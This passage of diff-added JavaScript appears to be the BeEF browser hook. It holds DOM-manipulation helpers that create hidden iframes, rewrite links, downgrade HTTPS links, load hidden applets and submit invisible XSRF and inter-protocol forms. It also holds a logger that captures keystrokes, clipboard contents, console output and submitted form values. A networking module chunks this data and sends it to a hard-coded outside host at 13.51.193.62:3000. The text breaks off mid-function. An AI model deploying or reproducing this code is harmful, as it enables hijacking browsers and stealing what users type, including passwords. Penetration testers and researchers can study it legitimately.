+	 * @param {Boolean} whether to return an associative array with the height AND the ID of the element
+	 * @return {Integer} Highest z-index in the DOM
+	 * OR
+	 * @return {Hash} A hash with the height and the ID of the highest element in the DOM {'height': INT, 'elem': STRING}
+	 */
+	getHighestZindex: function(include_id) {
+		var highest = {'height':0, 'elem':''};
+		$j('*').each(function() {
+			var current_high = parseInt($j(this).css("zIndex"),10);
+			if (current_high > highest.height) {
+				highest.height = current_high;
+				highest.elem = $j(this).attr('id');
+			}
+		});
+
+		if (include_id) {
+			return highest;
+		} else {
+			return highest.height;
+		}
+	},
+	
+	/**
+     * Create an iFrame element and prepend to document body. URI passed via 'src' property of function's 'params' parameter
+     * is assigned to created iframe tag's src attribute resulting in GET request to that URI.
+     * example usage in the code: beef.dom.createIframe('fullscreen', {'src':$j(this).attr('href')}, {}, null);
+	 * @param {String} type: can be 'hidden' or 'fullScreen'. defaults to normal
+	 * @param {Hash} params: list of params that will be sent in request.
+	 * @param {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
+	 * @param {Function} a callback function to fire once the iFrame has loaded
+	 * @return {Object} the inserted iFrame
+     *
+	 */
+	createIframe: function(type, params, styles, onload) {
+		var css = {};
+
+		if (type == 'hidden') {
+			css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles);
+		} else if (type == 'fullscreen') {
+			css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px', 'z-index':beef.dom.getHighestZindex()+1}, styles);
+			$j('body').css({'padding':'0px', 'margin':'0px'});
+		} else {
+			css = styles;
+			$j('body').css({'padding':'0px', 'margin':'0px'});
+		}
+		var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');
+		
+		return iframe;
+	},
+
+    /**
+     * Load the link (href value) in an overlay foreground iFrame.
+     * The BeEF hook continues to run in background.
+     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
+     * Framebusting techniques, this will not work.
+     */
+    persistentIframe: function(){
+        $j('a').click(function(e) {
+            if ($j(this).attr('href') != '')
+            {
+                e.preventDefault();
+                beef.dom.createIframe('fullscreen', {'src':$j(this).attr('href')}, {}, null);
+                $j(document).attr('title', $j(this).html());
+                document.body.scroll = "no";
+                document.documentElement.style.overflow = 'hidden';
+            }
+        });
+    },
+
+    /**
+     * Load a full screen div that is black, or, transparent
+     * @param {Boolean} vis: whether or not you want the screen dimmer enabled or not
+     * @param {Hash} options: a collection of options to customise how the div is configured, as follows:
+     *         opacity:0-100         // Lower number = less grayout higher = more of a blackout
+     *           // By default this is 70 
+     *         zindex: #             // HTML elements with a higher zindex appear on top of the gray out
+     *           // By default this will use beef.dom.getHighestZindex to always go to the top
+     *         bgcolor: (#xxxxxx)    // Standard RGB Hex color code
+     *           // By default this is #000000
+     */
+	grayOut: function(vis, options) {
+	  // in any order.  Pass only the properties you need to set.
+	  var options = options || {};
+	  var zindex = options.zindex || beef.dom.getHighestZindex()+1;
+	  var opacity = options.opacity || 70;
+	  var opaque = (opacity / 100);
+	  var bgcolor = options.bgcolor || '#000000';
+	  var dark=document.getElementById('darkenScreenObject');
+	  if (!dark) {
+	    // The dark layer doesn't exist, it's never been created.  So we'll
+	    // create it here and apply some basic styles.
+	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
+	    var tbody = document.getElementsByTagName("body")[0];
+	    var tnode = document.createElement('div');           // Create the layer.
+	        tnode.style.position='absolute';                 // Position absolutely
+	        tnode.style.top='0px';                           // In the top
+	        tnode.style.left='0px';                          // Left corner of the page
+	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
+	        tnode.style.display='none';                      // Start out Hidden
+	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
+	    tbody.appendChild(tnode);                            // Add it to the web page
+	    dark=document.getElementById('darkenScreenObject');  // Get the object.
+	  }
+	  if (vis) {
+	    // Calculate the page width and height 
+	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
+	        var pageWidth = document.body.scrollWidth+'px';
+	        var pageHeight = document.body.scrollHeight+'px';
+	    } else if( document.body.offsetWidth ) {
+	      var pageWidth = document.body.offsetWidth+'px';
+	      var pageHeight = document.body.offsetHeight+'px';
+	    } else {
+	       var pageWidth='100%';
+	       var pageHeight='100%';
+	    }
+	    //set the shader to cover the entire page and make it visible.
+	    dark.style.opacity=opaque;
+	    dark.style.MozOpacity=opaque;
+	    dark.style.filter='alpha(opacity='+opacity+')';
+	    dark.style.zIndex=zindex;
+	    dark.style.backgroundColor=bgcolor;
+	    dark.style.width= pageWidth;
+	    dark.style.height= pageHeight;
+	    dark.style.display='block';
+	  } else {
+	     dark.style.display='none';
+	  }
+	},
+
+	/**
+	 * Remove all external and internal stylesheets from the current page - sometimes prior to socially engineering,
+	 *  or, re-writing a document this is useful.
+	 */
+	removeStylesheets: function() {
+		$j('link[rel=stylesheet]').remove();
+		$j('style').remove();
+	},
+	
+	/**
+     * Create a form element with the specified parameters, appending it to the DOM if append == true
+	 * @param {Hash} params: params to be applied to the form element
+	 * @param {Boolean} append: automatically append the form to the body
+	 * @return {Object} a form object
+	 */
+	createForm: function(params, append) {
+		var form = $j('<form></form>').attr(params);
+		if (append)
+			$j('body').append(form);
+		return form;
+	},
+	
+	loadScript: function(url) {
+	  var s = document.createElement('script');
+	  s.type = 'text/javascript';
+	  s.src = url;
+	  $j('body').append(s);
+	},
+
+	/**
+	 * Get the location of the current page.
+	 * @return the location.
+	 */
+	getLocation: function() {
+		return document.location.href;
+	},
+	
+	/**
+	 * Get links of the current page.
+	 * @return array of URLs.
+	 */
+	getLinks: function() {
+		var linksarray = [];
+		var links = document.links;
+		for(var i = 0; i<links.length; i++) {
+			linksarray = linksarray.concat(links[i].href)		
+		};
+		return linksarray
+	},
+	
+	/**
+	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
+	 * @param {String} url: the url to be rewritten
+	 * @param {String} selector: the jquery selector statement to use, defaults to all a tags.
+	 * @return {Number} the amount of links found in the DOM and rewritten.
+	 */
+	rewriteLinks: function(url, selector) {
+		var sel = (selector == null) ? 'a' : selector;
+		return $j(sel).each(function() {
+			if ($j(this).attr('href') != null)
+			{
+				$j(this).attr('href', url).click(function() { return true; });
+			}
+		}).length;
+	},
+
+	/**
+	 * Rewrites all links matched by selector to url, leveraging Bilawal Hameed's hidden click event overwriting.
+	 * http://bilaw.al/2013/03/17/hacking-the-a-tag-in-100-characters.html
+	 * @param {String} url: the url to be rewritten
+	 * @param {String} selector: the jquery selector statement to use, defaults to all a tags.
+	 * @return {Number} the amount of links found in the DOM and rewritten.
+	 */
+	rewriteLinksClickEvents: function(url, selector) {
+		var sel = (selector == null) ? 'a' : selector;
+		return $j(sel).each(function() {
+			if ($j(this).attr('href') != null)
+			{
+				$j(this).click(function() {this.href=url});
+			}
+		}).length;
+	},
+
+	/**
+     * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
+	 * @param {String} old_protocol: the old link protocol to be rewritten
+	 * @param {String} new_protocol: the new link protocol to be written
+	 * @param {String} selector: the jquery selector statement to use, defaults to all a tags.
+	 * @return {Number} the amount of links found in the DOM and rewritten.
+	 */
+	rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {
+
+		var count = 0;
+		var re = new RegExp(old_protocol+"://", "gi");
+		var sel = (selector == null) ? 'a' : selector;
+
+		$j(sel).each(function() {
+			if ($j(this).attr('href') != null) {
+				var url = $j(this).attr('href');
+				if (url.match(re)) {
+					$j(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
+					count++;
+				}
+			}
+		});
+
+		return count;
+	},
+
+	/**
+	 * Parse all links in the page matched by the selector, replacing all telephone urls ('tel' protocol handler) with a new telephone number
+	 * @param {String} new_number: the new link telephone number to be written
+	 * @param {String} selector: the jquery selector statement to use, defaults to all a tags.
+	 * @return {Number} the amount of links found in the DOM and rewritten.
+	 */
+	rewriteTelLinks: function(new_number, selector) {
+
+		var count = 0;
+		var re = new RegExp("tel:/?/?.*", "gi");
+		var sel = (selector == null) ? 'a' : selector;
+
+		$j(sel).each(function() {
+			if ($j(this).attr('href') != null) {
+				var url = $j(this).attr('href');
+				if (url.match(re)) {
+					$j(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
+					count++;
+				}
+			}
+		});
+
+		return count;
+	},
+
+    /**
+     * Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
+     * @param {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
+     * @return {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
+     */
+    parseAppletParams: function(params){
+         var result = '';
+         for (i in params){
+           var param = params[i];
+           for(key in param){
+              result += "<param name='" + key + "' value='" + param[key] + "' />";
+           }
+         }
+        return result;
+    },
+
+    /**
+     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
+     * example usage in the code, using a JAR archive (recommended and faster):
+     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
+     * example usage in the code, using codebase:
+     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
+     * @param {String} id: reference identifier to the applet.
+     * @param {String} code: name of the class to be loaded. For example, beef.class.
+     * @param {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
+     * @param {String} archive: the jar that contains the code.
+     * @param {String} params: an array of additional params that the applet except.
+     */
+    attachApplet: function(id, name, code, codebase, archive, params) {
+        var content = null;
+        if (beef.browser.isIE()) {
+            content = "" + // the classid means 'use the latest JRE available to launch the applet'
+                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
+                "height='0' width='0' name='" + name + "'> " +
+                "<param name='code' value='" + code + "' />";
+
+            if (codebase != null) {
+                content += "<param name='codebase' value='" + codebase + "' />"
+            }
+            if (archive != null){
+                content += "<param name='archive' value='" + archive + "' />";
+            }
+            if (params != null) {
+                content += beef.dom.parseAppletParams(params);
+            }
+            content += "</object>";
+        }
+        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO() || beef.browser.isFF()) {
+
+            if (codebase != null) {
+                content = "" +
+                    "<applet id='" + id + "' code='" + code + "' " +
+                    "codebase='" + codebase + "' " +
+                    "height='0' width='0' name='" + name + "'>";
+            } else {
+                content = "" +
+                    "<applet id='" + id + "' code='" + code + "' " +
+                    "archive='" + archive + "' " +
+                    "height='0' width='0' name='" + name + "'>";
+            }
+
+            if (params != null) {
+                content += beef.dom.parseAppletParams(params);
+            }
+            content += "</applet>";
+        }
+        // For some reasons JavaPaylod is not working if the applet is attached to the DOM with the embed tag rather than the applet tag.
+//        if (beef.browser.isFF()) {
+//            if (codebase != null) {
+//                content = "" +
+//                    "<embed id='" + id + "' code='" + code + "' " +
+//                    "type='application/x-java-applet' codebase='" + codebase + "' " +
+//                    "height='0' width='0' name='" + name + "'>";
+//            } else {
+//                content = "" +
+//                    "<embed id='" + id + "' code='" + code + "' " +
+//                    "type='application/x-java-applet' archive='" + archive + "' " +
+//                    "height='0' width='0' name='" + name + "'>";
+//            }
+//
+//            if (params != null) {
+//                content += beef.dom.parseAppletParams(params);
+//            }
+//            content += "</embed>";
+//        }
+        $j('body').append(content);
+    },
+
+    /**
+     * Given an id, remove the applet from the DOM.
+     * @param {String} id: reference identifier to the applet.
+     */
+    detachApplet: function(id) {
+        $j('#' + id + '').detach();
+    },
+
+    /**
+     * Create an invisible iFrame with a form inside, and submit it. Useful for XSRF attacks delivered via POST requests.
+     * @param {String} action: the form action attribute, where the request will be sent.
+     * @param {String} method: HTTP method, usually POST.
+     * @param {String} enctype: form encoding type
+     * @param {Array} inputs: an array of inputs to be added to the form (type, name, value).
+     *         example: [{'type':'hidden', 'name':'1', 'value':''} , {'type':'hidden', 'name':'2', 'value':'3'}]
+     */
+    createIframeXsrfForm: function(action, method, enctype, inputs){
+        var iframeXsrf = beef.dom.createInvisibleIframe();
+
+        var formXsrf = document.createElement('form');
+        formXsrf.setAttribute('action',  action);
+        formXsrf.setAttribute('method',  method);
+        formXsrf.setAttribute('enctype', enctype);
+
+        var input = null;
+        for (i in inputs){
+            var attributes = inputs[i];
+            input = document.createElement('input');
+                for(key in attributes){
+                    if (key == 'name' && attributes[key] == 'submit') {
+                      // workaround for https://github.com/beefproject/beef/issues/1117
+                      beef.debug("createIframeXsrfForm - warning: changed form input 'submit' to 'Submit'");
+                      input.setAttribute('Submit', attributes[key]);
+                    } else {
+                      input.setAttribute(key, attributes[key]);
+                    }
+                }
+            formXsrf.appendChild(input);
+        }
+        iframeXsrf.contentWindow.document.body.appendChild(formXsrf);
+        formXsrf.submit();
+
+        return iframeXsrf;
+    },
+
+    /**
+     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
+     * @param {String} rhost: remote host ip/domain
+     * @param {String} rport: remote port
+     * @param {String} commands: protocol commands to be executed by the remote host:port service
+     */
+    createIframeIpecForm: function(rhost, rport, path, commands){
+        var iframeIpec = beef.dom.createInvisibleIframe();
+
+        var formIpec = document.createElement('form');
+        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
+        formIpec.setAttribute('method',  'POST');
+        formIpec.setAttribute('enctype', 'multipart/form-data');
+
+        input = document.createElement('textarea');
+        input.setAttribute('name', Math.random().toString(36).substring(5));
+        input.value = commands;
+        formIpec.appendChild(input);
+        iframeIpec.contentWindow.document.body.appendChild(formIpec);
+        formIpec.submit();
+
+        return iframeIpec;
+    }
+
+};
+
+beef.regCmp('beef.dom');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides logging capabilities.
+ * @namespace beef.logger
+ */
+beef.logger = {
+	
+	running: false,
+    /**
+    * Internal logger id
+    */
+    id: 0,
+	/**
+	 * Holds events created by user, to be sent back to BeEF
+	 */
+	events: [],
+	/**
+	 * Holds current stream of key presses
+	 */
+	stream: [],
+	/**
+	 * Contains current target of key presses
+	 */
+	target: null,
+	/**
+	 * Holds the time the logger was started
+	 */
+	time: null,
+    /**
+    * Holds the event details to be sent to BeEF
+    */
+    e: function() {
+        this.id = beef.logger.get_id();
+        this.time = beef.logger.get_timestamp();
+        this.type = null;
+        this.x = 0;
+        this.y = 0;
+        this.target = null;
+        this.data = null;
+        this.mods = null;
+    },
+    /**
+     * Prevents from recursive event handling on form submission
+     */
+    in_submit: false,
+	
+	/**
+	 * Starts the logger
+	 */
+	start: function() {
+
+		beef.browser.hookChildFrames();
+		this.running = true;
+		var d = new Date();
+		this.time = d.getTime();
+
+        $j(document).off('keypress');
+        $j(document).off('click');
+        $j(window).off('focus');
+        $j(window).off('blur');
+        $j('form').off('submit');
+        $j(document.body).off('copy');
+        $j(document.body).off('cut');
+        $j(document.body).off('paste');
+
+        if (!!window.console && typeof window.console == "object") {
+          try {
+            var oldInfo = window.console.info;
+            console.info = function (message) {
+              beef.logger.console('info', message);
+              oldInfo.apply(console, arguments);
+            };
+            var oldLog = window.console.log;
+            console.log = function (message) {
+              beef.logger.console('log', message);
+              oldLog.apply(console, arguments);
+            };
+            var oldWarn = window.console.warn;
+            console.warn = function (message) {
+              beef.logger.console('warn', message);
+              oldWarn.apply(console, arguments);
+            };
+            var oldDebug = window.console.debug;
+            console.debug = function (message) {
+              beef.logger.console('debug', message);
+              oldDebug.apply(console, arguments);
+            };
+            var oldError = window.console.error;
+            console.error = function (message) {
+              beef.logger.console('error', message);
+              oldError.apply(console, arguments);
+            };
+         } catch(e) {}
+       }
+
+		$j(document).keypress(
+			function(e) { beef.logger.keypress(e); }
+		).click(
+			function(e) { beef.logger.click(e); }
+		);
+		$j(window).focus(
+			function(e) { beef.logger.win_focus(e); }
+		).blur(
+			function(e) { beef.logger.win_blur(e); }
+		);
+		$j('form').submit(
+			function(e) { 
+                beef.logger.submit(e); 
+            }
+		);
+		$j(document.body).on('copy', function() {
+			setTimeout("beef.logger.copy();", 10);
+		});
+		$j(document.body).on('cut', function() {
+			setTimeout("beef.logger.cut();", 10);
+		});
+		$j(document.body).on('paste', function() {
+			beef.logger.paste();
+		});
+	},
+	
+	/**
+	 * Stops the logger
+	 */
+	stop: function() {
+		this.running = false;
+		clearInterval(this.timer);
+        $j(document).off('keypress');
+        $j(document).off('click');
+        $j(window).off('focus');
+        $j(window).off('blur');
+        $j('form').off('submit');
+        $j(document.body).off('copy');
+        $j(document.body).off('cut');
+        $j(document.body).off('paste');
+        // TODO: reset console
+	},
+
+    /**
+    * Get id
+    */
+    get_id: function() {
+        this.id++;
+        return this.id;
+    },
+
+	/**
+	 * Click function fires when the user clicks the mouse.
+	 */
+	click: function(e) {
+        var c = new beef.logger.e();
+        c.type = 'click';
+        c.x = e.pageX;
+        c.y = e.pageY;
+        c.target = beef.logger.get_dom_identifier(e.target);
+        this.events.push(c);
+	},
+	
+	/**
+	 * Fires when the window element has regained focus
+	 */
+	win_focus: function(e) {
+        var f = new beef.logger.e();
+        f.type = 'focus';
+        this.events.push(f);
+	},
+	
+	/**
+	 * Fires when the window element has lost focus
+	 */
+	win_blur: function(e) {
+        var b = new beef.logger.e();
+        b.type = 'blur';
+		this.events.push(b);
+	},
+	
+	/**
+	 * Keypress function fires everytime a key is pressed.
+	 * @param {Object} e: event object
+	 */
+	keypress: function(e) {
+		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
+		{
+			beef.logger.push_stream();
+			this.target = e.target;
+		}
+		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
+	},
+	
+	/**
+	 * Copy function fires when the user copies data to the clipboard.
+	 */
+	copy: function(x) {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'copy';
+			c.data = clipboardData.getData("Text");
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+	/**
+	 * Cut function fires when the user cuts data to the clipboard.
+	 */
+	cut: function() {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'cut';
+			c.data = clipboardData.getData("Text");
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+        /**
+         * Console function fires when data is sent to the browser console.
+         */
+        console: function(type, message) {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'console';
+			c.data = type + ': ' + message;
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+	/**
+	 * Paste function fires when the user pastes data from the clipboard.
+	 */
+	paste: function() {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'paste';
+			c.data = clipboardData.getData("Text");
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+	/**
+	 * Submit function fires whenever a form is submitted
+     * TODO: Cleanup this function
+	 */
+	submit: function(e) {
+        if (beef.logger.in_submit) {
+            return true;
+        }
+		try {
+			var f = new beef.logger.e();
+			f.type = 'submit';
+			f.target = beef.logger.get_dom_identifier(e.target);
+            var jqForms = $j(e.target);
+            var values = jqForms.find('input').map(function() { 
+                    var inp = $j(this);    
+                    return inp.attr('name') + '=' + inp.val(); 
+                }).get().join();
+            beef.debug('submitting form inputs: ' + values);
+            /*
+			for (var i = 0; i < e.target.elements.length; i++) {
+	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
+	        }
+            */
+			f.data = 'Action: '+jqForms.attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
+			this.events.push(f);
+            this.queue();
+            this.target = null;
+            beef.net.flush(function done() {
+                beef.debug("Submitting the form");
+                beef.logger.in_submit = true;
+                jqForms.submit();
+                beef.logger.in_submit = false;
+                beef.debug("Done submitting");
+            });
+            e.preventDefault();
+            return false;
+		} catch(e) {}
+	},
+	
+	/**
+	 * Pushes the current stream to the events queue
+	 */
+	push_stream: function() {
+		if (this.stream.length > 0)
+		{
+			this.events.push(beef.logger.parse_stream());
+			this.stream = [];
+		}
+	},
+	
+	/**
+	 * Translate DOM Object to a readable string
+	 */
+	get_dom_identifier: function(target) {
+		target = (target == null) ? this.target : target;
+		var id = '';
+		if (target)
+		{
+			id = target.tagName.toLowerCase();
+			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
+			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
+		}
+		return id;
+	},
+	
+	/**
+	 * Formats the timestamp
+	 * @return {String} timestamp string
+	 */
+	get_timestamp: function() {
+		var d = new Date();
+		return ((d.getTime() - this.time) / 1000).toFixed(3);
+	},
+	
+	/**
+	 * Parses stream array and creates history string
+	 */
+	parse_stream: function() {
+		var s = '';
+        var mods = '';
+		for (var i in this.stream){
+         try{
+            var mod = this.stream[i]['modifiers'];
+            s += String.fromCharCode(this.stream[i]['char']);
+            if(typeof mod != 'undefined' &&
+                      (mod['alt'] == true ||
+                      mod['ctrl'] == true ||
+                      mod['shift'] == true)){
+                mods += (mod['alt']) ? ' [Alt] ' : '';
+                mods += (mod['ctrl']) ? ' [Ctrl] ' : '';
+                mods += (mod['shift']) ? ' [Shift] ' : '';
+                mods += String.fromCharCode(this.stream[i]['char']);
+            }
+
+         }catch(e){}
+		}
+        var k = new beef.logger.e();
+        k.type = 'keys';
+        k.target = beef.logger.get_dom_identifier();
+        k.data = s;
+        k.mods = mods;
+        return k;
+	},
+	
+	/**
+	 * Queue results to be sent back to framework
+	 */
+	queue: function() {
+		beef.logger.push_stream();
+		if (this.events.length > 0)
+		{
+			beef.net.queue('/event', 0, this.events);
+			this.events = [];
+		}
+	}
+		
+};
+
+beef.regCmp('beef.logger');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides basic networking functions,
+ * like beef.net.request and beef.net.forgeRequest,
+ * used by BeEF command modules and the Requester extension,
+ * as well as beef.net.send which is used to return commands
+ * to BeEF server-side components.
+ *
+ * Also, it contains the core methods used by the XHR-polling
+ * mechanism (flush, queue)
+ * @namespace beef.net
+ *
+ */
+beef.net = {
+
+    host: "13.51.193.62",
+    port: "3000",
+    hook: "/hook.js",
+    httpproto: "http",
+    handler: '/dh',
+    chop: 500,
+    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
+    sid_count: 0,
+    cmd_queue: [],
+
+    /**
+     * Command object. This represents the data to be sent back to BeEF,
+     * using the beef.net.send() method.
+     */
+    command: function () {
+        this.cid = null;
+        this.results = null;
+        this.status = null;
+        this.handler = null;
+        this.callback = null;
+    },
+
+    /**
+     * Packet object. A single chunk of data. X packets -> 1 stream
+     */
+    packet: function () {
+        this.id = null;
+        this.data = null;
+    },
+
+    /**
+     * Stream object. Contains X packets, which are command result chunks.
+     */
+    stream: function () {
+        this.id = null;
+        this.packets = [];
+        this.pc = 0;
+        this.get_base_url_length = function () {
+            return (this.url + this.handler + '?' + 'bh=' + beef.session.get_hook_session_id()).length;
+        };
+        this.get_packet_data = function () {
+            var p = this.packets.shift();
+            return {'bh': beef.session.get_hook_session_id(), 'sid': this.id, 'pid': p.id, 'pc': this.pc, 'd': p.data }
+        };
+    },
+
+    /**
+     * Response Object - used in the beef.net.request callback
+     * NOTE: as we are using async mode, the response object will be empty if returned.
+     * Using sync mode, request obj fields will be populated.
+     */
+    response: function () {
+        this.status_code = null;        // 500, 404, 200, 302
+        this.status_text = null;        // success, timeout, error, ...
+        this.response_body = null;      // "<html>…." if not a cross-origin request
+        this.port_status = null;        // tcp port is open, closed or not http
+        this.was_cross_origin = null;   // true or false
+        this.was_timedout = null;       // the user specified timeout was reached
+        this.duration = null;           // how long it took for the request to complete
+        this.headers = null;            // full response headers
+    },
+
+    /**
+     * Queues the specified command results.
+     * @param {String} handler the server-side handler that will be called
+     * @param {Integer} cid command id
+     * @param {String} results the data to send
+     * @param {Integer} status the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
+     * @param {Function} callback the function to call after execution
+     */
+    queue: function (handler, cid, results, status, callback) {
+        if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
+            var s = new beef.net.command();
+            s.cid = cid;
+            s.results = beef.net.clean(results);
+            s.status = status;
+            s.callback = callback;
+            s.handler = handler;
+            this.cmd_queue.push(s);
+        }
+    },
+
+    /**
+     * Queues the current command results and flushes the queue straight away.
+     * NOTE: Always send Browser Fingerprinting results
+     * (beef.net.browser_details(); -> /init handler) using normal XHR-polling,
+     * even if WebSockets are enabled.
+     * @param {String} handler the server-side handler that will be called
+     * @param {Integer} cid command id
+     * @param {String} results the data to send
+     * @param {Integer} exec_status the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
+     * @param {Function} callback the function to call after execution
+     * @return {Integer} the command module execution status (defaults to 0 - 'unknown' if status is null)
+     */
+    send: function (handler, cid, results, exec_status, callback) {
+        // defaults to 'unknown' execution status if no parameter is provided, otherwise set the status
+        var status = 0;
+        if (exec_status != null && parseInt(Number(exec_status)) == exec_status){ status = exec_status}
+
+        if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
+            this.queue(handler, cid, results, status, callback);
+            this.flush();
+        } else {
+            try {
+                beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
+                    '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
+                    '", "status": "' + exec_status +
+                    '", "callback": "' + callback +
+                    '","bh":"' + beef.session.get_hook_session_id() + '" }');
+            } catch (e) {
+                this.queue(handler, cid, results, status, callback);
+                this.flush();
+            }
+        }
+
+        return status;
+    },
+
+    /**
+     * Flush all currently queued command results to the framework,
+     * chopping the data in chunks ('chunk' method) which will be re-assembled
+     * server-side by the network stack.
+     * NOTE: currently 'flush' is used only with the default
+     * XHR-polling mechanism. If WebSockets are used, the data is sent
+     * back to BeEF straight away.
+     */
+    flush: function (callback) {
+        if (this.cmd_queue.length > 0) {
+            var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
+            this.cmd_queue.length = 0;
+            this.sid_count++;
+            var stream = new this.stream();
+            stream.id = this.sid_count;
+            var pad = stream.get_base_url_length() + this.pad;
+            //cant continue if chop amount is too low
+            if ((this.chop - pad) > 0) {
+                var data = this.chunk(data, (this.chop - pad));
+                for (var i = 1; i <= data.length; i++) {
+                    var packet = new this.packet();
+                    packet.id = i;
+                    packet.data = data[(i - 1)];
+                    stream.packets.push(packet);
+                }
+                stream.pc = stream.packets.length;
+                this.push(stream, callback);
+            }
+        } else {
+            if ((typeof callback != 'undefined') && (callback != null)) {
+                callback();
+            }
+        }
+    },
+
+    /**
+     * Split the input data into chunk lengths determined by the amount parameter.
+     * @param {String} str the input data
+     * @param {Integer} amount chunk length
+     */
+    chunk: function (str, amount) {
+        if (typeof amount == 'undefined') n = 2;
+        return str.match(RegExp('.{1,' + amount + '}', 'g'));
+    },
+
+    /**
+     * Push the input stream back to the BeEF server-side components.
+     * It uses beef.net.request to send back the data.
+     * @param {Object} stream the stream object to be sent back.
+     */
+    push: function (stream, callback) {
+        //need to implement wait feature here eventually
+        if (typeof callback === 'undefined') {
+            callback = null;
+        }
+        for (var i = 0; i < stream.pc; i++) {
+            var cb = null;
+            if (i == (stream.pc - 1)) {
+                cb = callback;
+            }
+            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, 
+                    stream.get_packet_data(), 10, 'text', cb);
+        }
+    },
+
+    /**
+     * Performs http requests
+     * @param {String} scheme HTTP or HTTPS
+     * @param {String} method GET or POST
+     * @param {String} domain bindshell.net, 192.168.3.4, etc
+     * @param {Int} port 80, 5900, etc
+     * @param {String} path /path/to/resource
+     * @param {String} anchor this is the value that comes after the # in the URL
+     * @param {String} data This will be used as the query string for a GET or post data for a POST
+     * @param {Int} timeout timeout the request after N seconds
+     * @param {String} dataType specify the data return type expected (ie text/html/script)
+     * @param {Function} callback call the callback function at the completion of the method
+     *
+     * @return {Object} this object contains the response details
+     */
+    request: function (scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
+        //check if same origin or cross origin
+        var cross_origin = true;
+        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) { //strip eventual line breaks
+            if (document.location.port == "" || document.location.port == null) {
+                cross_origin = !(port == "80" || port == "443");
+            }
+        }
+
+        //build the url
+        var url = "";
+        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
+            url = path;
+        } else {
+            url = scheme + "://" + domain;
+            url = (port != null) ? url + ":" + port : url;
+            url = (path != null) ? url + path : url;
+            url = (anchor != null) ? url + "#" + anchor : url;
+        }
+
+        //define response object
+        var response = new this.response;
+        response.was_cross_origin = cross_origin;
+        var start_time = new Date().getTime();
+
+        /*
+         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
+         * This will turn POSTs into GETs for cross origin requests.
+         */
+        if (method == "POST") {
+            $j.ajaxSetup({
+                dataType: dataType
+            });
+        } else {
+            $j.ajaxSetup({
+                dataType: 'script'
+            });
+        }
+
+        //build and execute the request
+        $j.ajax({type: method,
+            url: url,
+            data: data,
+            timeout: (timeout * 1000),
+
+            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
+            beforeSend: function (xhr) {
+                if (method == "POST") {
+                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
+                }
+            },
+            success: function (data, textStatus, xhr) {
+                var end_time = new Date().getTime();
+                response.status_code = xhr.status;
+                response.status_text = textStatus;
+                response.response_body = data;
+                response.port_status = "open";
+                response.was_timedout = false;
